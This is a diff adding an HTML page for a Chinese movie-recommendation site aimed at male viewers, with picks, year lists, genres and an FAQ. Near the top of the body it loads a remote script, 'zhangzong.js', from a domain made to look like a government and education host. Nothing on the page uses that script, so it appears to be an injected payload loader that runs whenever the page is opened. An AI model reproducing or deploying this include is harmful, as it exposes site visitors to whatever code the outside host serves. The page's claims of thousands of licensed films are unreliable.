@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>哥们电影网｜哥俩好片单，国产兄弟片与男性题材电影在线看</title>
+<meta name="keywords" content="哥们电影网,兄弟题材电影,国产兄弟片推荐,男性向电影,哥们一起看,硬汉动作片">
+<meta name="description" content="哥们电影网，专为兄弟档准备的片单站。从热血动作到黑色喜剧，从江湖情义到爷们儿成长，哥俩一起看才够味，全部正版高清在线观看。">
+<link rel="canonical" href="https://gemendianyingwang-zh.github.io/">
+<style>
+:root{
+  --bg:#f4f4f2;--card:#ffffff;--ink:#111111;--sub:#6b6b6b;--line:#d8d8d5;
+  --acid:#c6ff3d;--neon:#ff3b30;--paper2:#1a1a1a;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"Helvetica Neue","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.65;overflow-x:hidden;
+  -webkit-tap-highlight-color:transparent;
+}
+a{color:inherit;text-decoration:none;}
+button{font-family:inherit;cursor:pointer;border:0;}
+ul{list-style:none;}
+::selection{background:var(--acid);color:#000;}
+
+.wrap{max-width:1240px;margin:0 auto;padding:0 28px;}
+section{padding:110px 0;}
+.eyebrow{font-size:12px;font-weight:800;letter-spacing:.22em;text-transform:uppercase;color:var(--sub);margin-bottom:20px;}
+h2.sec{font-size:64px;font-weight:900;line-height:.96;letter-spacing:-3px;}
+.sec-desc{color:var(--sub);font-size:17px;max-width:560px;margin-top:24px;}
+
+/* top */
+.topbar{border-bottom:1px solid var(--line);background:var(--bg);font-size:13px;}
+.topbar .wrap{display:flex;justify-content:space-between;padding:9px 28px;color:var(--sub);flex-wrap:wrap;gap:10px;}
+.topbar b{color:var(--ink);font-weight:700;}
+.topbar .dot{width:7px;height:7px;border-radius:50%;background:var(--neon);display:inline-block;margin-right:6px;animation:blink 1.4s infinite;}
+@keyframes blink{50%{opacity:.25}}
+
+/* nav */
+header{position:sticky;top:0;z-index:100;background:rgba(244,244,242,.94);backdrop-filter:blur(16px);border-bottom:1px solid var(--line);}
+.head{display:flex;align-items:center;justify-content:space-between;padding:20px 0;}
+.logo{font-size:30px;font-weight:900;letter-spacing:-1.5px;display:flex;align-items:baseline;gap:8px;}
+.logo i{font-style:normal;background:var(--ink);color:var(--acid);padding:2px 9px;border-radius:6px;font-size:18px;transform:rotate(-3deg);display:inline-block;}
+.nav{display:flex;gap:2px;align-items:center;}
+.nav a{padding:10px 15px;font-size:15px;font-weight:600;color:var(--sub);transition:.2s;}
+.nav a:hover{color:var(--ink);background:rgba(0,0,0,.05);border-radius:8px;}
+.nav a.hot{background:var(--ink);color:#fff;border-radius:8px;}
+.nav a.hot:hover{background:var(--neon);color:#fff;}
+.burger{display:none;width:44px;height:44px;background:var(--ink);color:var(--acid);border-radius:8px;font-size:20px;}
+
+/* hero */
+.hero{padding:80px 0 50px;position:relative;}
+.hero .grid{display:grid;grid-template-columns:1.35fr .65fr;gap:56px;align-items:end;}
+.hero h1{font-size:150px;line-height:.82;font-weight:950;letter-spacing:-7px;}
+.hero h1 s{text-decoration:none;background:var(--acid);padding:0 14px;display:inline-block;transform:skewX(-8deg) rotate(-2deg);}
+.hero h1 em{font-style:normal;color:var(--neon);}
+.hero .lede{font-size:19px;color:var(--sub);border-left:3px solid var(--ink);padding-left:20px;margin-bottom:26px;}
+.hero .meta{font-size:13px;color:var(--sub);border-top:1px solid var(--line);padding-top:18px;}
+.hero .meta span{display:inline-block;margin-right:26px;}
+.hero .meta strong{color:var(--ink);}
+
+.scroll-cue{margin-top:40px;font-size:13px;font-weight:700;letter-spacing:.15em;color:var(--sub);display:flex;align-items:center;gap:12px;}
+.scroll-cue::after{content:"";flex:1;height:1px;background:var(--line);}
+
+/* marquee big */
+.big-tape{background:var(--ink);color:#fff;padding:26px 0;overflow:hidden;}
+.big-tape .track{display:flex;gap:56px;white-space:nowrap;animation:tape 30s linear infinite;font-size:26px;font-weight:900;letter-spacing:-.5px;}
+.big-tape .track span{display:flex;align-items:center;gap:18px;}
+.big-tape .track i{font-style:normal;color:var(--acid);}
+@keyframes tape{to{transform:translateX(-50%);}}
+
+/* posters — magazine layout */
+.posters{display:grid;grid-template-columns:repeat(6,1fr);grid-auto-rows:120px;gap:16px;margin-top:48px;}
+.poster{grid-column:span 2;grid-row:span 2;background:var(--card);border:1px solid var(--line);border-radius:0;padding:20px;display:flex;flex-direction:column;justify-content:space-between;position:relative;overflow:hidden;transition:.25s;}
+.poster:hover{transform:translate(-4px,-4px);box-shadow:8px 8px 0 var(--ink);}
+.poster.lg{grid-column:span 3;grid-row:span 3;}
+.poster.xl{grid-column:span 4;grid-row:span 3;}
+.poster.tall{grid-row:span 3;}
+.poster .num{font-size:12px;font-weight:800;letter-spacing:.15em;color:var(--sub);}
+.poster .tag{position:absolute;top:16px;right:16px;font-size:11px;font-weight:800;background:var(--ink);color:#fff;padding:4px 8px;letter-spacing:.1em;}
+.poster .tag.acid{background:var(--acid);color:#000;}
+.poster .tag.red{background:var(--neon);color:#fff;}
+.poster h3{font-size:26px;font-weight:950;line-height:1.05;letter-spacing:-1px;}
+.poster.lg h3{font-size:40px;}
+.poster.xl h3{font-size:52px;letter-spacing:-2px;}
+.poster .info{display:flex;justify-content:space-between;font-size:13px;color:var(--sub);border-top:1px solid var(--line);padding-top:12px;}
+.poster .cover{position:absolute;inset:0;z-index:0;opacity:.16;}
+.poster > *{position:relative;z-index:1;}
+.poster .arrow{font-size:30px;line-height:1;}
+
+/* timeline */
+.line{position:relative;margin-top:48px;padding-left:0;}
+.row{display:grid;grid-template-columns:120px 1fr 1fr;gap:32px;padding:30px 0;border-top:1px solid var(--line);align-items:start;transition:.2s;}
+.row:hover{background:rgba(0,0,0,.025);}
+.row .yr{font-size:44px;font-weight:950;letter-spacing:-2px;line-height:1;}
+.row h4{font-size:22px;font-weight:900;letter-spacing:-.5px;}
+.row p{font-size:15px;color:var(--sub);margin-top:8px;}
+.row .right{font-size:14px;color:var(--sub);}
+.row .right b{display:block;color:var(--ink);font-size:15px;font-weight:800;margin-bottom:4px;}
+
+/* types */
+.types{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--line);background:var(--card);margin-top:48px;}
+.type{padding:34px 28px;border-right:1px solid var(--line);border-bottom:1px solid var(--line);transition:.25s;}
+.type:hover{background:var(--ink);color:#fff;}
+.type:hover p{color:#aaa;}
+.type .no{font-size:13px;font-weight:800;color:var(--neon);}
+.type h4{font-size:21px;font-weight:900;margin:10px 0 8px;letter-spacing:-.5px;}
+.type p{font-size:14.5px;color:var(--sub);transition:.2s;}
+.type .pick{margin-top:18px;font-size:13px;font-weight:700;letter-spacing:.05em;}
+
+/* numbers */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--ink);margin-top:48px;}
+.stat{padding:40px 30px;background:var(--bg);}
+.stat b{font-size:56px;font-weight:950;letter-spacing:-3px;line-height:1;display:block;}
+.stat b i{font-style:normal;color:var(--neon);}
+.stat span{font-size:14px;color:var(--sub);display:block;margin-top:10px;}
+
+/* qa */
+.qa-list{margin-top:48px;border-top:2px solid var(--ink);}
+.qa-item{border-bottom:1px solid var(--line);}
+.qa-q{width:100%;text-align:left;padding:26px 0;background:none;display:flex;justify-content:space-between;align-items:center;font-size:20px;font-weight:800;letter-spacing:-.3px;}
+.qa-q .sign{font-size:26px;font-weight:400;color:var(--sub);transition:.3s;flex-shrink:0;margin-left:20px;}
+.qa-item.open .sign{transform:rotate(45deg);color:var(--neon);}
+.qa-a{max-height:0;overflow:hidden;transition:max-height .4s ease;}
+.qa-a-inner{padding:0 0 26px;font-size:15.5px;color:var(--sub);max-width:820px;line-height:1.85;}
+.qa-item.open .qa-a{max-height:300px;}
+
+/* footer */
+footer{background:var(--paper2);color:#b8b8b8;padding:80px 0 0;}
+.foot{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:48px;padding-bottom:60px;}
+.logo.light{color:#fff;}
+.logo.light i{background:var(--acid);color:#000;}
+.foot p{color:#777;font-size:14.5px;margin-top:18px;max-width:340px;}
+.foot h5{font-size:14px;font-weight:800;color:#fff;letter-spacing:.1em;margin-bottom:20px;}
+.foot ul{display:grid;gap:12px;}
+.foot a{color:#888;font-size:14.5px;transition:.2s;}
+.foot a:hover{color:var(--acid);}
+.copy{padding:28px 0;border-top:1px solid #333;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:13px;color:#777;}
+.copy a{color:#888;}
+.copy a:hover{color:var(--acid);}
+.copy .big{font-size:40px;font-weight:950;color:#fff;letter-spacing:-2px;width:100%;margin-top:20px;}
+
+@media(max-width:1100px){
+  .hero h1{font-size:110px;}
+  .posters{grid-template-columns:repeat(4,1fr);}
+  .poster.xl,.poster.lg{grid-column:span 2;grid-row:span 2;}
+}
+@media(max-width:720px){
+  .nav{display:none;position:absolute;top:100%;left:0;right:0;flex-direction:column;background:var(--bg);border:1px solid var(--line);padding:12px;}
+  .nav.open{display:flex;}
+  .nav a{width:100%;text-align:left;}
+  .burger{display:grid;place-items:center;}
+  .hero .grid{grid-template-columns:1fr;gap:40px;}
+  .hero h1{font-size:62px;letter-spacing:-3px;}
+  h2.sec{font-size:40px;letter-spacing:-2px;}
+  .posters{grid-template-columns:repeat(2,1fr);grid-auto-rows:140px;}
+  .poster,.poster.lg,.poster.xl,.poster.tall{grid-column:span 2;grid-row:span 2;}
+  .poster.xl h3{font-size:32px;}
+  .row{grid-template-columns:1fr;gap:12px;}
+  .row .yr{font-size:32px;}
+  .types{grid-template-columns:1fr 1fr;}
+  .stats{grid-template-columns:1fr 1fr;}
+  .foot{grid-template-columns:1fr 1fr;gap:36px;}
+  .big-tape .track{font-size:19px;}
+  section{padding:70px 0;}
+}
+@media(max-width:420px){
+  .posters{grid-template-columns:1fr;}
+  .poster,.poster.lg,.poster.xl,.poster.tall{grid-column:span 1;}
+  .hero h1{font-size:52px;}
+  .types,.stats{grid-template-columns:1fr;}
+  .foot{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span><i class="dot"></i>今晚片单已更新 · 本周 42 部新片入库</span>
+    <span>观影热线：哥俩一起看才带劲 ｜ <b>访问入口</b>：https://gemendianyingwang-zh.github.io</span>
+  </div>
+</div>
+
+<header>
+  <div class="wrap">
+    <div class="head">
+      <a class="logo" href="#home"><i>哥们</i>电影网</a>
+      <nav class="nav" id="nav">
+        <a href="#home">首页</a>
+        <a href="#picks">本周硬片</a>
+        <a href="#years">年份片单</a>
+        <a href="#types">类型分区</a>
+        <a href="#qa">常见问题</a>
+        <a href="#" class="hot">🎬 哥俩开看</a>
+      </nav>
+      <button class="burger" id="burger">≡</button>
+    </div>
+  </div>
+</header>
+
+<!-- HERO -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="eyebrow">For Bros · 兄弟档专属片单站</div>
+    <div class="grid">
+      <div>
+        <h1>哥们<br><s>一起</s>看<br><em>才带劲</em></h1>
+      </div>
+      <div>
+        <p class="lede">一个人看是电影，哥俩一起看才是局。这里是专门给兄弟档整理的片单：热血动作、江湖情义、黑色幽默、爷们成长，每一种都够硬、够爽、够聊。</p>
+        <div class="meta">
+          <span><strong>8,600+</strong> 部影片</span>
+          <span><strong>142</strong> 位导演合集</span>
+          <span><strong>4K</strong> 修复专区</span>
+        </div>
+      </div>
+    </div>
+    <div class="scroll-cue">往下滚 · 挑片</div>
+  </div>
+</section>
+
+<!-- TAPE -->
+<div class="big-tape">
+  <div class="track">
+    <span>热血动作 <i>◆</i> 江湖情义</span><span>黑色喜剧 <i>◆</i> 硬汉成长</span>
+    <span>赛车枪战 <i>◆</i> 兄弟反目</span><span>国产犯罪 <i>◆</i> 男人四十</span>
+    <span>热血动作 <i>◆</i> 江湖情义</span><span>黑色喜剧 <i>◆</i> 硬汉成长</span>
+    <span>赛车枪战 <i>◆</i> 兄弟反目</span><span>国产犯罪 <i>◆</i> 男人四十</span>
+  </div>
+</div>
+
+<!-- POSTERS -->
+<section id="picks">
+  <div class="wrap">
+    <div class="eyebrow">This Week · 本周硬片</div>
+    <h2 class="sec">本周<br>必看六部</h2>
+    <p class="sec-desc">编辑部三个大男人关在小屋里投票投出来的结果，不掺水、不端着。</p>
+    <div class="posters">
+      <div class="poster xl">
+        <div class="cover"></div>
+        <div>
+          <span class="num">NO.01</span>
+          <span class="tag acid">本周首选</span>
+        </div>
+        <h3>最后一次<br>替兄弟挡枪</h3>
+        <div class="info"><span>2026 · 犯罪 / 动作</span><span>128 min</span></div>
+      </div>
+      <div class="poster">
+        <div><span class="num">NO.02</span><span class="tag">新片</span></div>
+        <h3>老炮儿<br>退休了</h3>
+        <div class="info"><span>2025 · 剧情</span><span>9.1</span></div>
+      </div>
+      <div class="poster">
+        <div><span class="num">NO.03</span></div>
+        <h3>兄弟<br>反目记</h3>
+        <div class="info"><span>2026 · 犯罪</span><span>8.7</span></div>
+      </div>
+      <div class="poster tall">
+        <div><span class="num">NO.04</span><span class="tag red">口碑炸</span></div>
+        <h3>我们在<br>高速上<br>吵了一夜</h3>
+        <div class="info"><span>2025 · 公路</span><span>9.0</span></div>
+      </div>
+      <div class="poster lg">
+        <div><span class="num">NO.05</span></div>
+        <h3>拳台之下<br>全是兄弟</h3>
+        <div class="info"><span>2024 · 运动 / 剧情</span><span>132 min</span></div>
+      </div>
+      <div class="poster">
+        <div><span class="num">NO.06</span></div>
+        <h3>烧烤摊<br>上的和解</h3>
+        <div class="info"><span>2026 · 喜剧</span><span>8.8</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- TIMELINE -->
+<section id="years" style="background:var(--card);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+  <div class="wrap">
+    <div class="eyebrow">By Year · 年份片单</div>
+    <h2 class="sec">顺着年份<br>往下翻</h2>
+    <p class="sec-desc">不按热度按年代，找回当年哥几个在录像厅、网吧、宿舍里一起看过的那种劲儿。</p>
+    <div class="line">
+      <div class="row">
+        <div class="yr">2026</div>
+        <div><h4>今年的狠角色</h4><p>院线新片刚刚下线就补进来，国产犯罪与现实主义题材占了大头。</p></div>
+        <div class="right"><b>18 部</b>含 4K 版本 · 更新至本周</div>
+      </div>
+      <div class="row">
+        <div class="yr">2024</div>
+        <div><h4>硬汉回潮的一年</h4><p>中年男性题材集体发力，拳击、赛车、跑船，全是男人的战场。</p></div>
+        <div class="right"><b>23 部</b>高分率 71%</div>
+      </div>
+      <div class="row">
+        <div class="yr">2020</div>
+        <div><h4>黑色幽默大年</h4><p>小成本犯罪喜剧扎堆，一票人围在电脑前笑到拍大腿。</p></div>
+        <div class="right"><b>15 部</b>收藏率最高</div>
+      </div>
+      <div class="row">
+        <div class="yr">2014</div>
+        <div><h4>青春热血的尾巴</h4><p>公路片、青春片、青春热血动作片扎堆，属于哥们的集体记忆。</p></div>
+        <div class="right"><b>21 部</b>怀旧专区</div>
+      </div>
+      <div class="row">
+        <div class="yr">2005</div>
+        <div><h4>港片最后的江湖</h4><p>卧底、兄弟、道义，一桌麻将一部戏，看完想给老友打个电话。</p></div>
+        <div class="right"><b>9 部</b>4K 修复</div>
+      </div>
+      <div class="row">
+        <div class="yr">1994</div>
+        <div><h4>传说中的那一年</h4><p>不用多说，那一年的片子随便拎一部出来都是一辈子的谈资。</p></div>
+        <div class="right"><b>6 部</b>殿堂级</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- TYPES -->
+<section id="types">
+  <div class="wrap">
+    <div class="eyebrow">Genres · 类型分区</div>
+    <h2 class="sec">挑个<br>爷们儿类型</h2>
+    <p class="sec-desc">八种口味，总有一种对上你今晚的心情。</p>
+    <div class="types">
+      <div class="type"><div class="no">01</div><h4>热血动作</h4><p>拳拳到肉，不靠特效靠真打。</p><div class="pick">查看片单 →</div></div>
+      <div class="type"><div class="no">02</div><h4>江湖犯罪</h4><p>卧底、兄弟、道义，男人之间那点事。</p><div class="pick">查看片单 →</div></div>
+      <div class="type"><div class="no">03</div><h4>黑色喜剧</h4><p>笑着笑着就沉默了，适合哥几个一起品。</p><div class="pick">查看片单 →</div></div>
+      <div class="type"><div class="no">04</div><h4>公路冒险</h4><p>一场说走就走的逃亡与和解。</p><div class="pick">查看片单 →</div></div>
+      <div class="type"><div class="no">05</div><h4>体育竞技</h4><p>拳击、赛车、跑船，赛场即人生。</p><div class="pick">查看片单 →</div></div>
+      <div class="type"><div class="no">06</div><h4>战争史诗</h4><p>兄弟连、战友情，男人的浪漫。</p><div class="pick">查看片单 →</div></div>
+      <div class="type"><div class="no">07</div><h4>悬疑烧脑</h4><p>哥俩边看边猜，看谁先猜中结局。</p><div class="pick">查看片单 →</div></div>
+      <div class="type"><div class="no">08</div><h4>经典怀旧</h4><p>录像厅年代的硬货，越看越上头。</p><div class="pick">查看片单 →</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- STATS -->
+<section style="padding:0 0 110px;">
+  <div class="wrap">
+    <div class="eyebrow">By The Numbers</div>
+    <h2 class="sec">站上<br>这点家底</h2>
+    <div class="stats">
+      <div class="stat"><b><i>8,600</i>+</b><span>部正版授权影片</span></div>
+      <div class="stat"><b>142</b><span>位导演完整合集</span></div>
+      <div class="stat"><b><i>4K</i></b><span>修复专区片源</span></div>
+      <div class="stat"><b>98%</b><span>用户复看率</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- QA -->
+<section id="qa" style="background:var(--card);border-top:1px solid var(--line);">
+  <div class="wrap">
+    <div class="eyebrow">FAQ · 哥几个常问</div>
+    <h2 class="sec">问题<br>都在这了</h2>
+    <div class="qa-list">
+      <div class="qa-item">
+        <button class="qa-q">为啥叫哥们电影网？<span class="sign">＋</span></button>
+        <div class="qa-a"><div class="qa-a-inner">因为我们专注做"兄弟档"这个视角：哥俩一起看才有味道的类型、年代和片子。女生爱看的甜宠和小清新这里不多，但爷们儿爱看的一样不缺。</div></div>
+      </div>
+      <div class="qa-item">
+        <button class="qa-q">片源从哪来，靠不靠谱？<span class="sign">＋</span></button>
+        <div class="qa-a"><div class="qa-a-inner">全部来自正版授权渠道，只提供合规的在线观看入口，不做任何下载搬运。版权窗口期未到的片子会明确标注"待上线"，不拿盗链凑数。</div></div>
+      </div>
+      <div class="qa-item">
+        <button class="qa-q">能两个人同时投屏看吗？<span class="sign">＋</span></button>
+        <div class="qa-a"><div class="qa-a-inner">一个账号支持两台设备同时在线，手机投电视、平板同步进度，哥俩窝沙发上各拿一台也不冲突。进度自动云同步，换设备接着看。</div></div>
+      </div>
+      <div class="qa-item">
+        <button class="qa-q">想找 90 年代港片怎么找？<span class="sign">＋</span></button>
+        <div class="qa-a"><div class="qa-a-inner">直接进「年份片单」选 1994、2005 这些年份，也可以按类型里的「经典怀旧」一次刷完。部分胶片做过 4K 修复，画质比当年录像带强太多。</div></div>
+      </div>
+      <div class="qa-item">
+        <button class="qa-q">有弹幕和评论区吗？<span class="sign">＋</span></button>
+        <div class="qa-a"><div class="qa-a-inner">有。哥几个可以边看边发弹幕吐槽，也支持建私人观影房，拉兄弟进来一起看、一起语音聊，和坐在一个沙发上没两样。</div></div>
+      </div>
+      <div class="qa-item">
+        <button class="qa-q">片单多久更新一次？<span class="sign">＋</span></button>
+        <div class="qa-a"><div class="qa-a-inner">每天补新片，每周出一版编辑精选，每月整理一次导演合集。更新公告会挂顶部状态条，进来看一眼就知道这周有啥新的。</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <a class="logo light" href="#home"><i>哥们</i>电影网</a>
+        <p>哥俩一起看才带劲。专注兄弟题材、男性向与硬核类型片的正版高清在线观看入口。</p>
+      </div>
+      <div>
+        <h5>片单导航</h5>
+        <ul><li><a href="#home">首页</a></li><li><a href="#picks">本周硬片</a></li><li><a href="#years">年份片单</a></li><li><a href="#types">类型分区</a></li></ul>
+      </div>
+      <div>
+        <h5>热门类型</h5>
+        <ul><li><a href="#">热血动作</a></li><li><a href="#">江湖犯罪</a></li><li><a href="#">黑色喜剧</a></li><li><a href="#">经典怀旧</a></li></ul>
+      </div>
+      <div>
+        <h5>帮助中心</h5>
+        <ul><li><a href="#qa">常见问题</a></li><li><a href="#">投屏教程</a></li><li><a href="#">版权声明</a></li><li><a href="#">意见反馈</a></li></ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© 2026 哥们电影网 版权所有</span>
+      <span>官方入口：<a href="https://gemendianyingwang-zh.github.io">https://gemendianyingwang-zh.github.io</a></span>
+      <div class="big">哥们，今晚看啥？</div>
+    </div>
+  </div>
+</footer>
+
+<script>
+var burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.addEventListener('click',function(e){if(e.target.tagName==='A'&&window.innerWidth<=720){nav.classList.remove('open');}});
+document.querySelectorAll('.qa-item').forEach(function(item){
+  item.querySelector('.qa-q').addEventListener('click',function(){item.classList.toggle('open');});
+});
+</script>
+</body>
+</html>
